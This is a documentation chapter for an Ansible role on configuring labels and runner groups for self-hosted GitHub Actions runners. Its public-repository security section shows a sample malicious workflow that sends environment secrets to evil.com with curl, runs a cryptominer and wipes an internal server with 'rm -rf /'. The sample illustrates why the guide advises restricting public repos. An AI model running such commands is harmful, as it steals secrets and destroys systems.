# Part 5: Labels & Runner Groups

> 🎬 **Video Tutorial Section**: Master labels and runner groups to control which repositories can use which runners. This is essential for security and resource management.

## 📋 Table of Contents

- [Understanding Labels](#understanding-labels)
- [Configuring Labels](#configuring-labels)
- [Label Strategies](#label-strategies)
- [Understanding Runner Groups](#understanding-runner-groups)
- [Creating Runner Groups](#creating-runner-groups)
- [Visibility: All vs Selected](#visibility-all-vs-selected)
- [Public Repositories Security](#public-repositories-security)
- [Complete Examples](#complete-examples)

---

## Understanding Labels

### What Are Labels?

Labels are **tags** that identify runner capabilities. They help GitHub match jobs to the right runners.

```
┌─────────────────────────────────────────────────────────────────────────┐
│                        How Labels Work                                   │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│   WORKFLOW FILE (.github/workflows/build.yml)                           │
│   ───────────────────────────────────────────                           │
│                                                                          │
│   jobs:                                                                  │
│     build:                                                               │
│       runs-on: [self-hosted, linux, docker, nodejs]                     │
│                 ↑                                                        │
│                 │ "Find me a runner with ALL these labels"              │
│                 │                                                        │
│   ─────────────────────────────────────────────────────────────────     │
│                                                                          │
│   AVAILABLE RUNNERS                                                      │
│   ─────────────────                                                      │
│                                                                          │
│   ┌─────────────────────────────────────────────────────────────┐      │
│   │ runner-01                                                    │      │
│   │ Labels: self-hosted, linux, docker, nodejs, X64             │      │
│   │                                                              │      │
│   │ ✅ HAS: self-hosted ✅ linux ✅ docker ✅ nodejs            │      │
│   │ ──────────────────────────────────────────────────────────  │      │
│   │ ✅ MATCH! This runner will be selected                      │      │
│   └─────────────────────────────────────────────────────────────┘      │
│                                                                          │
│   ┌─────────────────────────────────────────────────────────────┐      │
│   │ runner-02                                                    │      │
│   │ Labels: self-hosted, linux, python, X64                     │      │
│   │                                                              │      │
│   │ ✅ HAS: self-hosted ✅ linux ❌ docker ❌ nodejs            │      │
│   │ ──────────────────────────────────────────────────────────  │      │
│   │ ❌ NO MATCH - missing docker and nodejs                     │      │
│   └─────────────────────────────────────────────────────────────┘      │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

### Default Labels

Every runner automatically gets these labels:

| Label | Description | Value |
|-------|-------------|-------|
| `self-hosted` | Indicates self-hosted (not GitHub-hosted) | Always present |
| `Linux` | Operating system | Based on OS |
| `X64` or `ARM64` | Architecture | Based on CPU |

**Example**: A runner on Ubuntu x64 automatically has: `self-hosted`, `Linux`, `X64`

### Custom Labels

You add custom labels to describe runner capabilities:

| Label | Indicates |
|-------|-----------|
| `docker` | Docker is installed |
| `nodejs` | Node.js is installed |
| `python` | Python is installed |
| `gpu` | GPU available |
| `high-memory` | 32GB+ RAM |
| `production` | For production deployments |
| `molecule` | Can run Molecule tests |

---

## Configuring Labels

### Basic Label Configuration

```yaml
# Add custom labels to a runner
github_actions_runners_list:
  - name: "docker-runner"
    labels:
      - "docker"           # Docker installed
      - "docker-compose"   # Docker Compose available
```

### Labels Per Runner

```yaml
# Different runners with different capabilities
github_actions_runners_list:
  # Web development runner
  - name: "web-runner"
    labels:
      - "nodejs"
      - "npm"
      - "yarn"
      - "frontend"

  # Backend development runner
  - name: "backend-runner"
    labels:
      - "python"
      - "java"
      - "maven"
      - "backend"

  # DevOps runner
  - name: "devops-runner"
    labels:
      - "docker"
      - "kubernetes"
      - "terraform"
      - "ansible"
      - "molecule"
```

### Using Labels in Workflows

```yaml
# .github/workflows/build.yml

jobs:
  # This job needs Docker
  build-docker:
    runs-on: [self-hosted, docker]
    steps:
      - uses: actions/checkout@v4
      - run: docker build -t myapp .

  # This job needs Node.js
  build-frontend:
    runs-on: [self-hosted, nodejs, frontend]
    steps:
      - uses: actions/checkout@v4
      - run: npm install && npm run build

  # This job needs Molecule for Ansible tests
  test-ansible:
    runs-on: [self-hosted, molecule, ansible]
    steps:
      - uses: actions/checkout@v4
      - run: cd roles/docker && molecule test
```

---

## Label Strategies

### Strategy 1: Capability-Based Labels

Label runners by what they can DO:

```yaml
github_actions_runners_list:
  - name: "runner-01"
    labels:
      # Languages
      - "nodejs-18"      # Node.js 18 installed
      - "python-3.11"    # Python 3.11 installed
      
      # Tools
      - "docker"         # Docker available
      - "podman"         # Podman available
      
      # Features
      - "high-memory"    # 32GB+ RAM
      - "fast-storage"   # SSD storage
```

### Strategy 2: Environment-Based Labels

Label runners by their PURPOSE:

```yaml
github_actions_runners_list:
  # Development runners
  - name: "dev-runner-01"
    labels:
      - "development"
      - "testing"
      - "feature-branches"

  # Staging runners
  - name: "staging-runner-01"
    labels:
      - "staging"
      - "integration-tests"

  # Production runners
  - name: "prod-runner-01"
    labels:
      - "production"
      - "deployments"
```

### Strategy 3: Hybrid Approach (Recommended)

Combine capability AND environment labels:

```yaml
github_actions_runners_list:
  - name: "prod-docker-runner"
    labels:
      # Environment
      - "production"
      
      # Capabilities
      - "docker"
      - "kubernetes"
      - "high-memory"

  - name: "dev-nodejs-runner"
    labels:
      # Environment
      - "development"
      
      # Capabilities
      - "nodejs"
      - "npm"
      - "yarn"
```

**Usage in workflows:**

```yaml
jobs:
  # Development build - any dev runner with nodejs
  build:
    runs-on: [self-hosted, development, nodejs]
    
  # Production deployment - needs production + docker + kubernetes
  deploy:
    runs-on: [self-hosted, production, docker, kubernetes]
```

---

## Understanding Runner Groups

### What Are Runner Groups?

Runner groups provide **access control** - they determine **which repositories** can use **which runners**.

```
┌─────────────────────────────────────────────────────────────────────────┐
│                     Runner Groups Concept                                │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│   Think of Runner Groups like VIP access levels at an event:            │
│                                                                          │
│   ┌─────────────────────────────────────────────────────────────────┐   │
│   │  GROUP: "Default"                                                │   │
│   │  Access: Everyone                                                │   │
│   │                                                                  │   │
│   │  🎫 All repositories can use these runners                      │   │
│   │  Like: General admission - anyone with a ticket gets in         │   │
│   └─────────────────────────────────────────────────────────────────┘   │
│                                                                          │
│   ┌─────────────────────────────────────────────────────────────────┐   │
│   │  GROUP: "production"                                             │   │
│   │  Access: Selected repos only                                     │   │
│   │                                                                  │   │
│   │  🎟️ Only approved repositories can use these runners            │   │
│   │  Like: VIP section - need to be on the guest list              │   │
│   └─────────────────────────────────────────────────────────────────┘   │
│                                                                          │
│   ┌─────────────────────────────────────────────────────────────────┐   │
│   │  GROUP: "security-team"                                          │   │
│   │  Access: security-* repos only                                   │   │
│   │                                                                  │   │
│   │  🔐 Exclusive access for security team repositories             │   │
│   │  Like: Backstage - only crew members allowed                    │   │
│   └─────────────────────────────────────────────────────────────────┘   │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

### Labels vs Groups

| Feature | Labels | Groups |
|---------|--------|--------|
| **Purpose** | Match capabilities | Control access |
| **Question answered** | "Can this runner do what I need?" | "Is this repo allowed to use this runner?" |
| **Controlled by** | Runner configuration | Organization/Enterprise admin |
| **Repository visibility** | N/A | All or Selected |

**Important**: Labels and Groups work TOGETHER:

1. **Group** determines IF the repository can use the runner
2. **Labels** determine IF the runner has required capabilities

---

## Creating Runner Groups

### Automatic Group Creation

The role can automatically create groups:

```yaml
github_actions_runners_auto_create_groups: true  # Default: true

github_actions_runners_list:
  - name: "prod-runner-01"
    runner_group: "production"    # Group created automatically if missing
```

### Defining Groups Explicitly

For more control, define groups with specific settings:

```yaml
# Define runner groups
github_actions_runners_groups:
  # Group with full access (all repos)
  - name: "shared"
    visibility: "all"
    allows_public_repos: false

  # Group with restricted access (selected repos)
  - name: "production"
    visibility: "selected"
    allows_public_repos: false
    selected_repositories:
      - "frontend-app"
      - "backend-api"
      - "infrastructure"

  # Group for open source projects
  - name: "open-source"
    visibility: "all"
    allows_public_repos: true

# Assign runners to groups
github_actions_runners_list:
  - name: "shared-runner-01"
    runner_group: "shared"
    labels:
      - "general"

  - name: "prod-runner-01"
    runner_group: "production"
    labels:
      - "production"
      - "docker"

  - name: "oss-runner-01"
    runner_group: "open-source"
    labels:
      - "opensource"
```

---

## Visibility: All vs Selected

### Visibility: All

```yaml
github_actions_runners_groups:
  - name: "shared-runners"
    visibility: "all"              # All repos can use
```

```
┌─────────────────────────────────────────────────────────────────────────┐
│                     visibility: "all"                                    │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│   ┌─────────────┐  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐   │
│   │ Repo A      │  │ Repo B      │  │ Repo C      │  │ Any Repo    │   │
│   │ ✅ Can use  │  │ ✅ Can use  │  │ ✅ Can use  │  │ ✅ Can use  │   │
│   └──────┬──────┘  └──────┬──────┘  └──────┬──────┘  └──────┬──────┘   │
│          │                │                │                │           │
│          └────────────────┴────────────────┴────────────────┘           │
│                                    │                                     │
│                                    ▼                                     │
│                     ┌──────────────────────────┐                        │
│                     │  Runner Group: "shared"  │                        │
│                     │  visibility: all         │                        │
│                     │                          │                        │
│                     │  • shared-runner-01      │                        │
│                     │  • shared-runner-02      │                        │
│                     └──────────────────────────┘                        │
│                                                                          │
│   EQUIVALENT TO: Azure DevOps open_access: true                         │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

**Use when:**
- General purpose runners
- All repos should have equal access
- No sensitive operations on these runners

### Visibility: Selected

```yaml
github_actions_runners_groups:
  - name: "production-runners"
    visibility: "selected"
    selected_repositories:           # Only these repos can use
      - "frontend-app"
      - "backend-api"
      - "infrastructure"
```

```
┌─────────────────────────────────────────────────────────────────────────┐
│                     visibility: "selected"                               │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│   ┌─────────────┐  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐   │
│   │ frontend-app│  │ backend-api │  │ infrastructure│ │ other-repo  │   │
│   │ ✅ Can use  │  │ ✅ Can use  │  │ ✅ Can use  │  │ ❌ Denied   │   │
│   └──────┬──────┘  └──────┬──────┘  └──────┬──────┘  └─────────────┘   │
│          │                │                │                             │
│          └────────────────┴────────────────┘                             │
│                           │                                              │
│                           ▼                                              │
│            ┌──────────────────────────────┐                             │
│            │  Runner Group: "production"  │                             │
│            │  visibility: selected        │                             │
│            │                              │                             │
│            │  selected_repositories:      │                             │
│            │    - frontend-app            │                             │
│            │    - backend-api             │                             │
│            │    - infrastructure          │                             │
│            │                              │                             │
│            │  • prod-runner-01            │                             │
│            │  • prod-runner-02            │                             │
│            └──────────────────────────────┘                             │
│                                                                          │
│   EQUIVALENT TO: Azure DevOps open_access: false                        │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

**Use when:**
- Production deployments
- Runners with access to sensitive resources
- Need strict access control

---

## Public Repositories Security

### The allows_public_repos Setting

```
┌─────────────────────────────────────────────────────────────────────────┐
│                     allows_public_repos Explained                        │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│   PUBLIC REPOSITORY RISK:                                               │
│   ───────────────────────                                                │
│                                                                          │
│   Public repos = Anyone on the internet can:                            │
│   • Fork the repository                                                 │
│   • Create pull requests                                                │
│   • Trigger workflows (depending on settings)                           │
│                                                                          │
│   If allows_public_repos: true                                          │
│   ────────────────────────────                                           │
│   A malicious PR could run code on YOUR runner:                         │
│                                                                          │
│   jobs:                                                                  │
│     hack:                                                                │
│       runs-on: [self-hosted, linux]                                     │
│       steps:                                                             │
│         - run: |                                                         │
│             # Steal secrets                                             │
│             curl http://evil.com/collect?data=$(env)                    │
│             # Crypto mining                                             │
│             ./cryptominer                                               │
│             # Lateral movement                                          │
│             ssh internal-server "rm -rf /"                              │
│                                                                          │
│   ─────────────────────────────────────────────────────────────────     │
│                                                                          │
│   RECOMMENDATION:                                                        │
│   ────────────────                                                       │
│   allows_public_repos: false  (for most runners)                        │
│   allows_public_repos: true   (ONLY for ephemeral, isolated runners)    │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

### Safe Configuration for Public Repos

If you MUST support public repositories:

```yaml
github_actions_runners_groups:
  # SECURE: Ephemeral runners for public repos
  - name: "open-source-ephemeral"
    visibility: "all"
    allows_public_repos: true      # Allowed because...

github_actions_runners_list:
  - name: "oss-runner-01"
    runner_group: "open-source-ephemeral"
    ephemeral: true                # ...runner is ephemeral!
    labels:
      - "opensource"
      - "ephemeral"
```

**Why ephemeral makes it safer:**
- Runner executes ONE job, then deletes itself
- No state persists between jobs
- Fresh environment every time
- Malicious code can't persist

---

## Complete Examples

### Example 1: Small Team (Simple Setup)

```yaml
---
# Simple setup for small team
# All repos share the same runners

- name: Deploy Simple Runner Setup
  hosts: github_runners
  become: true

  vars_files:
    - vars/github_secrets.yml

  vars:
    github_actions_runners_token: "{{ vault_github_token }}"
    github_actions_runners_scope: "organization"
    github_actions_runners_organization: "small-team"

    # Single group with open access
    github_actions_runners_groups:
      - name: "team-runners"
        visibility: "all"
        allows_public_repos: false

    # Three runners with different capabilities
    github_actions_runners_list:
      - name: "runner-docker"
        runner_group: "team-runners"
        labels:
          - "docker"
          - "compose"

      - name: "runner-nodejs"
        runner_group: "team-runners"
        labels:
          - "nodejs"
          - "npm"

      - name: "runner-python"
        runner_group: "team-runners"
        labels:
          - "python"
          - "pip"

  roles:
    - code3tech.devtools.github_actions_runners
```

### Example 2: Enterprise (Full Access Control)

```yaml
---
# Enterprise setup with full access control
# Different teams have different runners

- name: Deploy Enterprise Runner Setup
  hosts: github_runners
  become: true

  vars_files:
    - vars/github_secrets.yml

  vars:
    github_actions_runners_token: "{{ vault_github_token }}"
    github_actions_runners_scope: "organization"
    github_actions_runners_organization: "enterprise-corp"

    # Multiple groups with different access levels
    github_actions_runners_groups:
      # Development: All repos can use
      - name: "development"
        visibility: "all"
        allows_public_repos: false

      # Staging: Selected repos only
      - name: "staging"
        visibility: "selected"
        selected_repositories:
          - "frontend-app"
          - "backend-api"
          - "mobile-app"
        allows_public_repos: false

      # Production: Only critical repos
      - name: "production"
        visibility: "selected"
        selected_repositories:
          - "frontend-app"
          - "backend-api"
        allows_public_repos: false

      # Open Source: Public repos allowed (ephemeral only!)
      - name: "open-source"
        visibility: "all"
        allows_public_repos: true

    # Runners assigned to groups
    github_actions_runners_list:
      # Development runners
      - name: "dev-runner-01"
        runner_group: "development"
        labels:
          - "development"
          - "docker"
          - "fast"

      - name: "dev-runner-02"
        runner_group: "development"
        labels:
          - "development"
          - "nodejs"
          - "python"

      # Staging runners
      - name: "staging-runner-01"
        runner_group: "staging"
        labels:
          - "staging"
          - "docker"
          - "integration-tests"

      # Production runners
      - name: "prod-runner-01"
        runner_group: "production"
        labels:
          - "production"
          - "docker"
          - "deployments"
          - "secure"

      - name: "prod-runner-02"
        runner_group: "production"
        labels:
          - "production"
          - "kubernetes"
          - "helm"
          - "secure"

      # Open source runners (ephemeral for security!)
      - name: "oss-runner-01"
        runner_group: "open-source"
        ephemeral: true              # Critical for security!
        labels:
          - "opensource"
          - "ephemeral"
          - "untrusted"

  roles:
    - code3tech.devtools.github_actions_runners
```

### Example 3: Workflow Using Labels and Groups

```yaml
# .github/workflows/deploy.yml
name: Build and Deploy

on:
  push:
    branches: [main, staging]
  pull_request:
    branches: [main]

jobs:
  # Build: Uses development runners (any team can build)
  build:
    runs-on: [self-hosted, development, docker]
    steps:
      - uses: actions/checkout@v4
      - run: docker build -t myapp:${{ github.sha }} .
      - run: docker push myapp:${{ github.sha }}

  # Test: Uses staging runners (only approved repos)
  integration-tests:
    needs: build
    runs-on: [self-hosted, staging, integration-tests]
    steps:
      - run: ./run-integration-tests.sh

  # Deploy: Uses production runners (restricted access)
  deploy:
    needs: integration-tests
    if: github.ref == 'refs/heads/main'
    runs-on: [self-hosted, production, kubernetes]
    environment: production        # Requires approval
    steps:
      - run: kubectl apply -f k8s/
```

---

## Quick Reference

### Group Configuration Options

| Option | Type | Default | Description |
|--------|------|---------|-------------|
| `name` | string | Required | Group name |
| `visibility` | string | `"all"` | `"all"` or `"selected"` |
| `allows_public_repos` | boolean | `false` | Allow public repos to use |
| `selected_repositories` | list | `[]` | Repos that can use (when visibility=selected) |

### Variables for Groups

| Variable | Type | Default | Description |
|----------|------|---------|-------------|
| `github_actions_runners_auto_create_groups` | boolean | `true` | Auto-create groups |
| `github_actions_runners_default_group_visibility` | string | `"all"` | Default visibility |
| `github_actions_runners_default_group_allows_public_repos` | boolean | `false` | Default public repos setting |
| `github_actions_runners_groups` | list | `[]` | Group definitions |

---

**Next Section**: [Part 6: Advanced Features](06-advanced-features.md) →

← **Previous Section**: [Part 4: Runner Scopes](04-runner-scopes.md)

---

[← Back to User Guides](../README.md)
